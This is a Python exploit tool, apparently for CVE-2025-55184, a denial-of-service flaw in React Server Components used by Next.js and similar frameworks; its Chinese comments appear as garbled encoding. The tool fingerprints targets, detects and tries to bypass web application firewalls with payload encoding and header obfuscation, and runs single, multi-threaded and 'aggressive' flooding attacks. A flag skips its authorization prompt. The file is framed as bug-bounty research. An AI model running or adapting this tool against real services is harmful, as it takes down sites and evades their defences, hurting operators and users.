#!/usr/bin/env python3
"""
CVE-2025-55184 é«˜çº§åˆ©ç”¨å·¥å…·
ä¸“ä¸š RSC DoS æ¡†æ¶ï¼Œç”¨äºé“å¾·æ¼æ´èµé‡‘ç ”ç©¶

ä½œè€…: CyberTechAjju
ç‰ˆæœ¬: 1.0.0
"""

import requests
import argparse
import sys
import time
import threading
from typing import Dict, List, Optional
from datetime import datetime
import json

# å¯¼å…¥è‡ªå®šä¹‰æ¨¡å—
from modules.ui_manager import UIManager
from modules.waf_bypass import WAFBypass
from modules.utils import Utils


class CVE2025_55184_Exploiter:
    def __init__(self, target: str, config: Dict = None):
        self.target = target
        self.config = config or Utils.load_config()
        self.payloads_db = Utils.load_payloads()
        self.ui = UIManager()
        self.waf = WAFBypass()
        self.utils = Utils()

        # ç»Ÿè®¡ä¿¡æ¯
        self.stats = {
            'total_requests': 0,          # æ€»è¯·æ±‚æ•°
            'successful': 0,              # æˆåŠŸæ•°
            'timeouts': 0,                # è¶…æ—¶æ•°
            'errors': 0,                  # é”™è¯¯æ•°
            'success_rate': 0.0           # æˆåŠŸç‡
        }

        # ç»“æœå­˜å‚¨
        self.results = []
        self.target_info = {}

    def run(self, mode: str):
        """æ¼æ´åˆ©ç”¨çš„ä¸»è¦å…¥å£ç‚¹"""
        self.ui.show_banner()
        self.ui.show_warning()

        # æˆæƒæ£€æŸ¥
        if self.config.get('ethical_controls', {}).get('require_authorization', True):
            if not self.ui.get_authorization(self.target):
                self.ui.print_error("æˆæƒè¢«æ‹’ç»ã€‚é€€å‡ºã€‚")
                sys.exit(1)

        self.ui.print_success("æˆæƒç¡®è®¤ã€‚ç»§ç»­æµ‹è¯•...")
        print()

        # è§£æå’ŒéªŒè¯ç›®æ ‡
        self.target_info = self._fingerprint_target()
        self.ui.show_target_info(self.target_info)
        print()

        # æ‰§è¡Œé€‰å®šæ¨¡å¼
        if mode == 'detect':
            self._run_detection()
        elif mode == 'scan':
            self._run_active_scan()
        elif mode == 'single':
            self._run_single_shot()
        elif mode == 'multi':
            self._run_multi_threaded()
        elif mode == 'aggressive':
            self._run_aggressive()
        elif mode == 'waf':
            self._run_waf_bypass()
        elif mode == 'report':
            self._generate_report()
        else:
            self.ui.print_error(f"æœªçŸ¥æ¨¡å¼: {mode}")

    def _fingerprint_target(self) -> Dict:
        """æŒ‡çº¹è¯†åˆ«ç›®æ ‡å¹¶æ”¶é›†ä¿¡æ¯"""
        with self.ui.show_spinner("æ­£åœ¨æŒ‡çº¹è¯†åˆ«ç›®æ ‡"):
            target_parsed = self.utils.parse_target(self.target)

            # è§£æDNS
            ip_address = self.utils.resolve_dns(target_parsed['hostname'])

            # æ£€æŸ¥ç«¯å£æ˜¯å¦å¼€æ”¾
            port_open = self.utils.check_port_open(
                target_parsed['hostname'],
                target_parsed['port']
            )

            # å°è¯•è·å–æœåŠ¡å™¨å¤´éƒ¨ä¿¡æ¯
            try:
                response = requests.head(
                    self.target,
                    timeout=5,
                    headers={'User-Agent': self.waf.get_random_user_agent()}
                )
                server_info = self.utils.fingerprint_server(dict(response.headers))
            except:
                server_info = {'framework': 'æœªçŸ¥', 'server': 'æœªçŸ¥'}

            return {
                'URL': self.target,
                'IP Address': ip_address or 'æœªçŸ¥',
                'Port': target_parsed['port'],
                'Port Status': 'ğŸŸ¢ å¼€æ”¾' if port_open else 'ğŸ”´ å…³é—­',
                'Framework': server_info.get('framework', 'æœªçŸ¥'),
                'Server': server_info.get('server', 'æœªçŸ¥'),
                'Powered By': server_info.get('powered_by', 'æœªçŸ¥')
            }

    def _run_detection(self):
        """è¿è¡Œè¢«åŠ¨æ£€æµ‹æ¨¡å¼"""
        self.ui.print_info("è¿è¡Œè¢«åŠ¨æ£€æµ‹ï¼ˆéä¾µå…¥å¼ï¼‰...")
        time.sleep(1)

        with self.ui.show_spinner("æ£€æµ‹æ¡†æ¶å’Œæ¼æ´"):
            # æ£€æŸ¥æ¡†æ¶
            framework = self.target_info.get('Framework', 'æœªçŸ¥').lower()

            # æ£€æŸ¥RSCæŒ‡æ ‡
            vulnerable = False
            confidence = 0

            if 'next' in framework:
                vulnerable = True
                confidence = 75
            elif 'waku' in framework:
                vulnerable = True
                confidence = 70
            elif 'remix' in framework:
                vulnerable = True
                confidence = 60

            time.sleep(2)

        print()
        self.ui.show_vulnerability_status(vulnerable, confidence)

        if vulnerable:
            self.ui.print_warning("âš ï¸  è¢«åŠ¨æŒ‡æ ‡è¡¨æ˜å¯èƒ½å­˜åœ¨æ¼æ´")
            self.ui.print_info("ğŸ’¡ è¿è¡Œä¸»åŠ¨æ‰«æä»¥ç¡®è®¤ï¼š--mode scan")

    def _run_active_scan(self):
        """è¿è¡Œä¸»åŠ¨æ¼æ´æ‰«æ"""
        self.ui.print_info("è¿è¡Œä¸»åŠ¨æ‰«æï¼ˆæœ€å°å½±å“ï¼‰...")
        print()

        # é¦–å…ˆæ£€æµ‹WAF
        waf_info = self._detect_waf()
        self.ui.show_waf_detection(waf_info)
        print()

        # å°è¯•å¤šä¸ªè½½è·
        framework = self.target_info.get('Framework', 'æœªçŸ¥').lower()
        payloads_to_test = self._get_framework_payloads(framework)

        vulnerable = False
        successful_payload = None

        with self.ui.create_progress_bar("æµ‹è¯•è½½è·") as progress:
            task = progress.add_task("[cyan]æ‰«æä¸­...", total=len(payloads_to_test))

            for payload_name, payload_data in payloads_to_test.items():
                # æµ‹è¯•è½½è·
                result = self._test_payload(payload_name, payload_data, waf_info)

                if result['vulnerable']:
                    vulnerable = True
                    successful_payload = payload_name
                    break

                progress.update(task, advance=1)
                time.sleep(0.5)

        print()

        # æ˜¾ç¤ºç»“æœ
        if vulnerable:
            self.ui.show_vulnerability_status(True, 95)
            self.ui.print_success(f"âœ… æ¼æ´å·²ç¡®è®¤ï¼Œä½¿ç”¨è½½è·: {successful_payload}")

            # æ˜¾ç¤ºè½½è·è¯¦æƒ…
            print()
            self.ui.show_payload_info(successful_payload, payloads_to_test[successful_payload])
        else:
            self.ui.show_vulnerability_status(False)
            self.ui.print_success("ç›®æ ‡ä¼¼ä¹å·²ä¿®è¡¥æˆ–ä¸å­˜åœ¨æ¼æ´")

    def _test_payload(self, payload_name: str, payload_data: Dict, waf_info: Dict) -> Dict:
        """æµ‹è¯•å•ä¸ªè½½è·"""
        payload = payload_data.get('payload')
        encoding = payload_data.get('encoding', 'none')

        # å¦‚æœæ£€æµ‹åˆ°WAFï¼Œåˆ™åº”ç”¨WAFç»•è¿‡
        if waf_info.get('detected'):
            bypass_strategy = self.waf.generate_bypass_strategy(waf_info.get('type', '').split(',')[0])
            if encoding in bypass_strategy.get('techniques', []):
                payload = self.waf.encode_payload(payload, encoding)

        # å‡†å¤‡è¯·æ±‚
        framework = self.target_info.get('Framework', 'æœªçŸ¥').lower()
        headers = self._get_headers(framework, waf_info)

        timeout = self.config.get('defaults', {}).get('timeout', 5)

        try:
            start_time = time.time()
            response = requests.post(
                self.target,
                files={"0": ("", payload)},
                headers=headers,
                timeout=timeout
            )
            elapsed = time.time() - start_time

            self.stats['total_requests'] += 1

            # å¦‚æœè¯·æ±‚å¿«é€Ÿå®Œæˆï¼Œå¯èƒ½ä¸å­˜åœ¨æ¼æ´
            return {
                'vulnerable': False,
                'payload': payload_name,
                'elapsed_time': elapsed,
                'status_code': response.status_code
            }

        except requests.exceptions.Timeout:
            # è¶…æ—¶è¡¨ç¤ºå¯èƒ½çš„DoSæ”»å‡»
            self.stats['total_requests'] += 1
            self.stats['successful'] += 1
            self.stats['timeouts'] += 1

            return {
                'vulnerable': True,
                'payload': payload_name,
                'elapsed_time': timeout,
                'error': 'è¶…æ—¶ - å¯èƒ½å­˜åœ¨æ¼æ´'
            }

        except requests.exceptions.RequestException as e:
            self.stats['total_requests'] += 1
            self.stats['errors'] += 1

            return {
                'vulnerable': False,
                'payload': payload_name,
                'error': str(e)
            }

    def _run_single_shot(self):
        """æ‰§è¡Œå•æ¬¡DoSæ”»å‡»"""
        self.ui.print_warning("âš¡ å¯åŠ¨å•æ¬¡DoSæ”»å‡»...")
        print()

        # è·å–åŸºæœ¬è½½è·
        payload_data = self.payloads_db['payloads']['basic']
        payload = payload_data['payload']

        framework = self.target_info.get('Framework', 'æœªçŸ¥').lower()
        headers = self._get_headers(framework)

        timeout = self.config.get('defaults', {}).get('timeout', 5)

        with self.ui.show_spinner("å‘é€åˆ©ç”¨è½½è·"):
            try:
                requests.post(
                    self.target,
                    files={"0": ("", payload)},
                    headers=headers,
                    timeout=timeout
                )
                self.ui.print_error("[-] ç›®æ ‡ä¸å­˜åœ¨æ¼æ´ï¼ˆè¯·æ±‚å·²å®Œæˆï¼‰")
            except requests.exceptions.Timeout:
                self.ui.print_success("[+] DoSæ”»å‡»æˆåŠŸ - ç›®æ ‡è¶…æ—¶ï¼")
                self.stats['successful'] += 1
            except requests.exceptions.RequestException as e:
                self.ui.print_error(f"[!] é”™è¯¯: {str(e)}")

    def _run_multi_threaded(self):
        """æ‰§è¡Œå¤šçº¿ç¨‹DoSæ”»å‡»"""
        num_threads = self.config.get('attack_modes', {}).get('moderate', {}).get('threads', 5)
        duration = self.config.get('attack_modes', {}).get('moderate', {}).get('duration', 30)

        self.ui.print_warning(f"âš¡ å¯åŠ¨å¤šçº¿ç¨‹æ”»å‡»ï¼ˆ{num_threads}ä¸ªçº¿ç¨‹ï¼ŒæŒç»­{duration}ç§’ï¼‰...")
        print()

        # ç¡®è®¤
        confirm = self.ui.prompt_input(f"è¿™å°†å‘é€å¤šä¸ªè¯·æ±‚ã€‚æ˜¯å¦ç»§ç»­ï¼Ÿ(yes/no)")
        if confirm.lower() != 'yes':
            self.ui.print_info("æ”»å‡»å·²å–æ¶ˆ")
            return

        print()

        # å¼€å§‹æ”»å‡»
        stop_event = threading.Event()
        threads = []

        def attack_worker():
            payload = self.payloads_db['payloads']['basic']['payload']
            framework = self.target_info.get('Framework', 'æœªçŸ¥').lower()

            while not stop_event.is_set():
                headers = self._get_headers(framework)
                headers = self.waf.obfuscate_headers(headers)

                try:
                    requests.post(
                        self.target,
                        files={"0": ("", payload)},
                        headers=headers,
                        timeout=5
                    )
                    self.stats['total_requests'] += 1
                except requests.exceptions.Timeout:
                    self.stats['timeouts'] += 1
                    self.stats['successful'] += 1
                    self.stats['total_requests'] += 1
                except:
                    self.stats['errors'] += 1
                    self.stats['total_requests'] += 1

                time.sleep(self.waf.apply_timing_variation())

        # å¯åŠ¨çº¿ç¨‹
        for i in range(num_threads):
            t = threading.Thread(target=attack_worker)
            t.start()
            threads.append(t)

        # ç›‘æ§è¿›åº¦
        with self.ui.create_progress_bar("æ”»å‡»è¿›è¡Œä¸­") as progress:
            task = progress.add_task("[red]æ”»å‡»ä¸­...", total=duration)

            for _ in range(duration):
                time.sleep(1)
                progress.update(task, advance=1)

        # åœæ­¢çº¿ç¨‹
        stop_event.set()
        for t in threads:
            t.join()

        # æ˜¾ç¤ºç»“æœ
        print()
        self._update_success_rate()
        self.ui.show_result('success', 'æ”»å‡»å®Œæˆ',
                            f"æ€»è¯·æ±‚æ•°: {self.stats['total_requests']}\n"
                            f"è¶…æ—¶æ•°: {self.stats['timeouts']}\n"
                            f"æˆåŠŸç‡: {self.stats['success_rate']:.1f}%"
                            )

    def _run_aggressive(self):
        """æ‰§è¡Œæ¿€è¿›çš„æŒç»­æ”»å‡»"""
        self.ui.print_error("ğŸ”¥ æ¿€è¿›æ¨¡å¼ - é«˜å½±å“æ”»å‡»")
        self.ui.print_warning("æ­¤æ¨¡å¼å°†å¯¼è‡´ä¸¥é‡çš„æœåŠ¡ä¸­æ–­ï¼")
        print()

        confirm = self.ui.prompt_input("è¾“å…¥'I UNDERSTAND THE IMPACT'ä»¥ç»§ç»­")
        if confirm != 'I UNDERSTAND THE IMPACT':
            self.ui.print_info("æ”»å‡»å·²å–æ¶ˆ")
            return

        # ä½¿ç”¨æ¿€è¿›é…ç½®
        num_threads = self.config.get('attack_modes', {}).get('aggressive', {}).get('threads', 10)
        duration = self.config.get('attack_modes', {}).get('aggressive', {}).get('duration', 60)

        self.ui.print_info(f"å¯åŠ¨æ¿€è¿›æ”»å‡»ï¼š{num_threads}ä¸ªçº¿ç¨‹ï¼ŒæŒç»­{duration}ç§’")
        print()

        # ç±»ä¼¼äºå¤šçº¿ç¨‹ä½†ä½¿ç”¨æ‰€æœ‰è½½è·
        self._run_multi_threaded()

    def _run_waf_bypass(self):
        """è¿è¡ŒWAFæ£€æµ‹å’Œç»•è¿‡æµ‹è¯•"""
        self.ui.print_info("ğŸ›¡ï¸  è¿è¡ŒWAFæ£€æµ‹å’Œç»•è¿‡æµ‹è¯•...")
        print()

        # æ£€æµ‹WAF
        waf_info = self._detect_waf()
        self.ui.show_waf_detection(waf_info)
        print()

        if not waf_info['detected']:
            self.ui.print_success("æœªæ£€æµ‹åˆ°WAF - å¯ä»¥è¿›è¡Œæ ‡å‡†åˆ©ç”¨")
            return

        # ç”Ÿæˆç»•è¿‡ç­–ç•¥
        waf_type = waf_info.get('type', '').split(',')[0].strip()
        strategy = self.waf.generate_bypass_strategy(waf_type)

        self.ui.show_result('info', 'WAFç»•è¿‡ç­–ç•¥',
                            f"WAFç±»å‹: {waf_type}\n"
                            f"ç­–ç•¥: {strategy.get('description')}\n"
                            f"æŠ€æœ¯: {', '.join(strategy.get('techniques', []))}"
                            )

        # æµ‹è¯•ç»•è¿‡
        print()
        self.ui.print_info("æµ‹è¯•ç»•è¿‡æŠ€æœ¯...")

        # å°è¯•å„ç§ç»•è¿‡æ–¹æ³•
        vulnerable = False
        for technique in strategy.get('techniques', []):
            payload = self.payloads_db['payloads']['basic']['payload']
            encoded_payload = self.waf.encode_payload(payload, technique)

            self.ui.print_info(f"  å°è¯•{technique}ç¼–ç ...")

            # æµ‹è¯•
            result = self._test_payload('basic', {'payload': encoded_payload, 'encoding': technique}, waf_info)

            if result.get('vulnerable'):
                vulnerable = True
                self.ui.print_success(f"  âœ… ä½¿ç”¨{technique}ç»•è¿‡æˆåŠŸï¼")
                break
            else:
                self.ui.print_error(f"  âœ— {technique}å¤±è´¥")

        print()
        if vulnerable:
            self.ui.show_vulnerability_status(True, 85)
        else:
            self.ui.print_warning("WAFç»•è¿‡å°è¯•å¤±è´¥")

    def _detect_waf(self) -> Dict:
        """æ£€æµ‹WAFä¿æŠ¤"""
        try:
            response = requests.get(
                self.target,
                headers={'User-Agent': self.waf.get_random_user_agent()},
                timeout=5
            )

            waf_info = self.waf.detect_waf(dict(response.headers), response.text)
            return waf_info

        except Exception as e:
            return {'detected': False, 'type': None, 'confidence': 0, 'bypass_available': False}

    def _get_headers(self, framework: str, waf_info: Dict = None) -> Dict:
        """è·å–é€‚ç”¨äºæ¡†æ¶çš„å¤´éƒ¨ä¿¡æ¯"""
        headers = {'User-Agent': self.waf.get_random_user_agent()}

        if 'next' in framework.lower():
            headers['Next-Action'] = 'x'

        # å¦‚æœæ£€æµ‹åˆ°WAFåˆ™åº”ç”¨æ··æ·†
        if waf_info and waf_info.get('detected'):
            headers = self.waf.obfuscate_headers(headers)

        return headers

    def _get_framework_payloads(self, framework: str) -> Dict:
        """è·å–é€‚ç”¨äºæ£€æµ‹åˆ°çš„æ¡†æ¶çš„è½½è·"""
        all_payloads = self.payloads_db.get('payloads', {})
        framework_payloads = {}

        for name, data in all_payloads.items():
            if framework in data.get('frameworks', []):
                framework_payloads[name] = data

        # å¦‚æœæ²¡æœ‰ç‰¹å®šè½½è·ï¼Œåˆ™è¿”å›å…¨éƒ¨
        if not framework_payloads:
            return all_payloads

        return framework_payloads

    def _update_success_rate(self):
        """æ›´æ–°æˆåŠŸç‡ç»Ÿè®¡"""
        self.stats['success_rate'] = self.utils.calculate_success_rate(
            self.stats['successful'],
            self.stats['total_requests']
        )

    def _generate_report(self):
        """ç”Ÿæˆæ¼æ´èµé‡‘æŠ¥å‘Š"""
        self.ui.print_info("ğŸ“Š ç”Ÿæˆæ¼æ´èµé‡‘æŠ¥å‘Š...")

        report_data = {
            'target': self.target,
            'timestamp': self.utils.format_timestamp(),
            'target_info': self.target_info,
            'vulnerable': self.stats['successful'] > 0,
            'confidence': 90 if self.stats['successful'] > 0 else 10,
            'statistics': self.stats,
            'framework': self.target_info.get('Framework', 'æœªçŸ¥'),
            'server': self.target_info.get('Server', 'æœªçŸ¥'),
            'ip_address': self.target_info.get('IP Address', 'æœªçŸ¥')
        }

        # ä¿å­˜ä¸ºå¤šç§æ ¼å¼
        output_dir = self.config.get('reporting', {}).get('output_dir', './reports')

        json_path = self.utils.save_report(report_data, 'json', output_dir)
        md_path = self.utils.save_report(report_data, 'markdown', output_dir)
        html_path = self.utils.save_report(report_data, 'html', output_dir)

        print()
        self.ui.print_success(f"æŠ¥å‘Šå·²ä¿å­˜:")
        self.ui.print_info(f"  ğŸ“„ JSON: {json_path}")
        self.ui.print_info(f"  ğŸ“„ Markdown: {md_path}")
        self.ui.print_info(f"  ğŸ“„ HTML: {html_path}")


def main():
    parser = argparse.ArgumentParser(
        description='CVE-2025-55184 é«˜çº§åˆ©ç”¨å·¥å…· by CyberTechAjju',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
ç¤ºä¾‹:
  # è¢«åŠ¨æ£€æµ‹
  python cve_2025_55184_exploit.py -t http://localhost:3000 -m detect

  # ä¸»åŠ¨æ‰«æ
  python cve_2025_55184_exploit.py -t http://localhost:3000 -m scan

  # å•æ¬¡DoSæ”»å‡»
  python cve_2025_55184_exploit.py -t http://localhost:3000 -m single

  # å¤šçº¿ç¨‹æ”»å‡»
  python cve_2025_55184_exploit.py -t http://localhost:3000 -m multi

  # WAFç»•è¿‡
  python cve_2025_55184_exploit.py -t http://localhost:3000 -m waf

  # ç”ŸæˆæŠ¥å‘Š
  python cve_2025_55184_exploit.py -t http://localhost:3000 -m report

æ¨¡å¼:
  detect      - è¢«åŠ¨æ£€æµ‹ï¼ˆå®‰å…¨ï¼Œéä¾µå…¥å¼ï¼‰
  scan        - ä¸»åŠ¨æ¼æ´æ‰«æï¼ˆæœ€å°å½±å“ï¼‰
  single      - å•æ¬¡DoSæ”»å‡»ï¼ˆä½å¼ºåº¦ï¼‰
  multi       - å¤šçº¿ç¨‹æ”»å‡»ï¼ˆä¸­ç­‰å½±å“ï¼‰
  aggressive  - æ¿€è¿›çš„æŒç»­æ”»å‡»ï¼ˆé«˜å½±å“ï¼‰
  waf         - WAFæ£€æµ‹å’Œç»•è¿‡æµ‹è¯•
  report      - ç”Ÿæˆæ¼æ´èµé‡‘æŠ¥å‘Š
        """
    )

    parser.add_argument('-t', '--target', required=True, help='ç›®æ ‡URL')
    parser.add_argument('-m', '--mode', required=True,
                        choices=['detect', 'scan', 'single', 'multi', 'aggressive', 'waf', 'report'],
                        help='åˆ©ç”¨æ¨¡å¼')
    parser.add_argument('-c', '--config', default='config.json', help='é…ç½®æ–‡ä»¶è·¯å¾„')
    parser.add_argument('--no-auth', action='store_true', help='è·³è¿‡æˆæƒæç¤ºï¼ˆå±é™©ï¼ï¼‰')

    args = parser.parse_args()

    # åŠ è½½é…ç½®
    config = Utils.load_config(args.config)

    # å¦‚æœè¯·æ±‚åˆ™è¦†ç›–æˆæƒè®¾ç½®
    if args.no_auth:
        if 'ethical_controls' not in config:
            config['ethical_controls'] = {}
        config['ethical_controls']['require_authorization'] = False

    # åˆå§‹åŒ–åˆ©ç”¨å™¨
    exploiter = CVE2025_55184_Exploiter(args.target, config)

    try:
        exploiter.run(args.mode)
    except KeyboardInterrupt:
        print("\n\n")
        exploiter.ui.print_warning("âš ï¸  æ”»å‡»è¢«ç”¨æˆ·ä¸­æ–­")
        sys.exit(0)
    except Exception as e:
        print("\n\n")
        exploiter.ui.print_error(f"é”™è¯¯: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()